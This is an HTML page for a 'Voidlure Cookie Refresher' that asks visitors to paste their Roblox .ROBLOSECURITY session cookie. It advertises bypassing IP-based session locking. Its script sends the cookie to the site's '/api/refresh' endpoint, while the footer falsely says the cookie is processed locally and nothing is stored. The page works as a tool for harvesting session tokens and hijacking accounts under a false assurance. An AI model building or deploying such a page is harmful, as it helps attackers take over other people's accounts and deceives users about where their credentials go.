<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Voidlure Cookie Refresher</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #000000;
            overflow: hidden;
            color: #ffffff;
        }

        #particle-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
        }

        .card {
            position: relative;
            z-index: 1;
            background: linear-gradient(145deg, rgba(255, 255, 255, 0.05), rgba(0, 0, 0, 0.95));
            padding: 2.5rem 2.8rem;
            border-radius: 1.25rem;
            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.9), 0 0 0 1px rgba(255, 255, 255, 0.06);
            max-width: 600px;
            width: 100%;
            backdrop-filter: blur(8px);
            border: 1px solid rgba(255, 255, 255, 0.05);
        }

        .card h1 {
            font-size: 1.6rem;
            font-weight: 600;
            margin-bottom: 0.4rem;
            letter-spacing: -0.01em;
            background: linear-gradient(135deg, #ffffff, #888888);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .card .subtitle {
            font-size: 0.95rem;
            color: #888888;
            margin-bottom: 1.8rem;
            line-height: 1.5;
        }

        .card .subtitle span {
            color: #cccccc;
            font-weight: 500;
        }

        .input-group {
            display: flex;
            flex-direction: column;
            gap: 0.6rem;
            margin-bottom: 1.4rem;
        }

        .input-group label {
            font-size: 0.85rem;
            font-weight: 500;
            color: #aaaaaa;
            letter-spacing: 0.02em;
            text-transform: uppercase;
        }

        .input-group textarea {
            width: 100%;
            padding: 0.8rem 1rem;
            border-radius: 0.7rem;
            border: 1px solid rgba(255, 255, 255, 0.08);
            background: rgba(255, 255, 255, 0.03);
            color: #ffffff;
            font-size: 0.8rem;
            font-family: 'Courier New', monospace;
            transition: all 0.2s ease;
            outline: none;
            resize: vertical;
            min-height: 100px;
            line-height: 1.4;
        }

        .input-group textarea::placeholder {
            color: #555555;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            font-size: 0.85rem;
        }

        .input-group textarea:focus {
            border-color: rgba(255, 255, 255, 0.2);
            background: rgba(255, 255, 255, 0.06);
            box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.04);
        }

        .input-group textarea:disabled {
            opacity: 0.4;
            cursor: not-allowed;
        }

        .button-row {
            display: flex;
            gap: 0.8rem;
            align-items: center;
            margin-top: 0.4rem;
        }

        .btn {
            flex: 1;
            padding: 0.8rem 1.2rem;
            border-radius: 0.7rem;
            border: none;
            font-weight: 600;
            font-size: 0.95rem;
            cursor: pointer;
            transition: all 0.2s ease;
            background: linear-gradient(135deg, #ffffff, #666666);
            color: #000000;
            letter-spacing: 0.01em;
            position: relative;
            overflow: hidden;
        }

        .btn:hover:not(:disabled) {
            transform: translateY(-1px);
            box-shadow: 0 8px 25px rgba(255, 255, 255, 0.15);
        }

        .btn:active:not(:disabled) {
            transform: translateY(0px);
            box-shadow: 0 4px 12px rgba(255, 255, 255, 0.08);
        }

        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        .btn .spinner {
            display: inline-block;
            width: 1.1rem;
            height: 1.1rem;
            border: 2px solid rgba(0, 0, 0, 0.2);
            border-top-color: #000000;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            vertical-align: middle;
            margin-right: 0.5rem;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .btn-copy {
            flex: 0 0 auto;
            padding: 0.8rem 1.2rem;
            border-radius: 0.7rem;
            border: 1px solid rgba(255, 255, 255, 0.06);
            background: rgba(255, 255, 255, 0.03);
            color: #aaaaaa;
            font-size: 1.1rem;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .btn-copy:hover:not(:disabled) {
            background: rgba(255, 255, 255, 0.06);
            color: #ffffff;
        }

        .btn-copy:disabled {
            opacity: 0.3;
            cursor: not-allowed;
        }

        .status {
            margin-top: 1.2rem;
            padding: 0.7rem 1rem;
            border-radius: 0.6rem;
            font-size: 0.9rem;
            display: none;
            animation: fadeSlide 0.3s ease;
            border-left: 3px solid transparent;
        }

        .status.success {
            display: block;
            background: rgba(255, 255, 255, 0.05);
            border-left-color: #ffffff;
            color: #ffffff;
        }

        .status.error {
            display: block;
            background: rgba(255, 255, 255, 0.05);
            border-left-color: #888888;
            color: #aaaaaa;
        }

        .status.info {
            display: block;
            background: rgba(255, 255, 255, 0.05);
            border-left-color: #666666;
            color: #888888;
        }

        .footer-note {
            margin-top: 1.2rem;
            font-size: 0.75rem;
            color: #444444;
            text-align: center;
            letter-spacing: 0.03em;
        }

        @keyframes fadeSlide {
            from { opacity: 0; transform: translateY(-6px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @media (max-width: 540px) {
            .card {
                padding: 1.8rem 1.5rem;
                margin: 1rem;
                border-radius: 1rem;
            }

            .card h1 {
                font-size: 1.3rem;
            }

            .button-row {
                flex-direction: column;
            }

            .btn-copy {
                flex: 1;
                width: 100%;
            }
        }
    </style>
</head>
<body>

    <canvas id="particle-canvas"></canvas>

    <div class="card">
        <h1>Voidlure Cookie Refresher</h1>
        <p class="subtitle">
            Refresh your <span>ROBLOX</span> cookie to bypass IP-based session locking.
        </p>

        <div class="input-group">
            <label for="cookieInput">.ROBLOSECURITY Cookie</label>
            <textarea
                id="cookieInput"
                placeholder="Paste your .ROBLOSECURITY cookie here..."
                autocomplete="off"
                spellcheck="false"
            ></textarea>
        </div>

        <div class="button-row">
            <button class="btn" id="refreshBtn">
                <span id="btnText">Refresh</span>
            </button>
            <button class="btn-copy" id="copyBtn" title="Copy result">📋</button>
        </div>

        <div id="status" class="status"></div>

        <div class="footer-note">
            Your cookie is processed locally. No data is stored.
        </div>
    </div>

    <script>
        (function initParticles() {
            var canvas = document.getElementById('particle-canvas');
            var ctx = canvas.getContext('2d');
            var width, height;
            var particles = [];
            var PARTICLE_COUNT = 180;
            var CONNECTION_DIST = 100;
            var MAX_SPEED = 0.35;

            function resize() {
                width = canvas.width = window.innerWidth;
                height = canvas.height = window.innerHeight;
            }

            window.addEventListener('resize', resize);
            resize();

            function Particle() {
                this.x = Math.random() * width;
                this.y = Math.random() * height;
                this.vx = (Math.random() - 0.5) * MAX_SPEED * 2;
                this.vy = (Math.random() - 0.5) * MAX_SPEED * 2;
                this.size = Math.random() * 2 + 0.5;
                this.opacity = Math.random() * 0.3 + 0.1;
            }

            Particle.prototype.update = function() {
                this.x += this.vx;
                this.y += this.vy;
                if (this.x < 0 || this.x > width) this.vx *= -1;
                if (this.y < 0 || this.y > height) this.vy *= -1;
                this.x = Math.max(0, Math.min(width, this.x));
                this.y = Math.max(0, Math.min(height, this.y));
            };

            Particle.prototype.draw = function() {
                ctx.beginPath();
                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
                ctx.fillStyle = 'rgba(255,255,255,' + this.opacity + ')';
                ctx.fill();
            };

            for (var i = 0; i < PARTICLE_COUNT; i++) {
                particles.push(new Particle());
            }

            function drawConnections() {
                for (var i = 0; i < particles.length; i++) {
                    for (var j = i + 1; j < particles.length; j++) {
                        var dx = particles[i].x - particles[j].x;
                        var dy = particles[i].y - particles[j].y;
                        var dist = Math.sqrt(dx * dx + dy * dy);
                        if (dist < CONNECTION_DIST) {
                            var alpha = (1 - dist / CONNECTION_DIST) * 0.08;
                            ctx.beginPath();
                            ctx.moveTo(particles[i].x, particles[i].y);
                            ctx.lineTo(particles[j].x, particles[j].y);
                            ctx.strokeStyle = 'rgba(255,255,255,' + alpha + ')';
                            ctx.lineWidth = 0.5;
                            ctx.stroke();
                        }
                    }
                }
            }

            function animate() {
                ctx.clearRect(0, 0, width, height);
                for (var p = 0; p < particles.length; p++) {
                    particles[p].update();
                    particles[p].draw();
                }
                drawConnections();
                requestAnimationFrame(animate);
            }

            animate();
        })();

        (function initRefresher() {
            var input = document.getElementById('cookieInput');
            var refreshBtn = document.getElementById('refreshBtn');
            var btnText = document.getElementById('btnText');
            var copyBtn = document.getElementById('copyBtn');
            var status = document.getElementById('status');

            var isProcessing = false;
            var lastResult = '';

            function setStatus(message, type) {
                status.textContent = message;
                status.className = 'status ' + type;
                status.style.display = message ? 'block' : 'none';
            }

            function clearStatus() { setStatus('', ''); }

            function isValidCookie(cookie) {
                var trimmed = cookie.trim();
                if (!trimmed) return false;
                return trimmed.indexOf('_|WARNING') === 0 || trimmed.length > 80;
            }

            function extractToken(input) {
                var cleaned = input.trim();
                cleaned = cleaned.replace(/^cookie:\s*/i, '');
                cleaned = cleaned.replace(/^\.ROBLOSECURITY=/, '');
                cleaned = cleaned.replace(/^"|"$/g, '');
                return cleaned.trim();
            }

            async function refreshCookie() {
                if (isProcessing) return;

                var rawInput = input.value;
                if (!rawInput.trim()) {
                    setStatus('Please paste a .ROBLOSECURITY cookie.', 'error');
                    return;
                }

                var token = extractToken(rawInput);
                if (!isValidCookie(token)) {
                    setStatus('Invalid cookie format. Must contain "_|WARNING".', 'error');
                    return;
                }

                isProcessing = true;
                refreshBtn.disabled = true;
                btnText.innerHTML = '<span class="spinner"></span> Refreshing...';
                clearStatus();

                try {
                    var response = await fetch('/api/refresh', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ cookie: token })
                    });

                    var data = await response.json();

                    if (data.success && data.cookie) {
                        lastResult = data.cookie;
                        input.value = data.cookie;
                        setStatus('Cookie refreshed successfully.', 'success');
                        copyBtn.disabled = false;
                    } else {
                        setStatus('Refresh failed: ' + (data.message || 'Unknown error'), 'error');
                    }
                } catch (error) {
                    setStatus('Failed to connect to refresh service. Check your internet connection.', 'error');
                }

                isProcessing = false;
                refreshBtn.disabled = false;
                btnText.innerHTML = 'Refresh';
            }

            function copyResult() {
                if (!lastResult) {
                    setStatus('Nothing to copy. Refresh a cookie first.', 'error');
                    return;
                }
                navigator.clipboard.writeText(lastResult)
                    .then(function() { setStatus('Copied to clipboard.', 'success'); })
                    .catch(function() {
                        input.select();
                        document.execCommand('copy');
                        setStatus('Copied.', 'success');
                    });
            }

            refreshBtn.addEventListener('click', refreshCookie);
            copyBtn.addEventListener('click', copyResult);

            input.addEventListener('keydown', function(e) {
                if (e.key === 'Enter' && e.ctrlKey) {
                    e.preventDefault();
                    refreshCookie();
                }
            });

            input.addEventListener('paste', function() {
                setTimeout(clearStatus, 100);
            });

            copyBtn.disabled = true;
            clearStatus();

            window.__refresher = { refreshCookie: refreshCookie, copyResult: copyResult };
        })();

        document.addEventListener('keydown', function(e) {
            if (e.altKey && e.key === 't') {
                e.preventDefault();
                var el = document.getElementById('cookieInput');
                if (el) el.focus();
            }
        });
    </script>

</body>
</html>
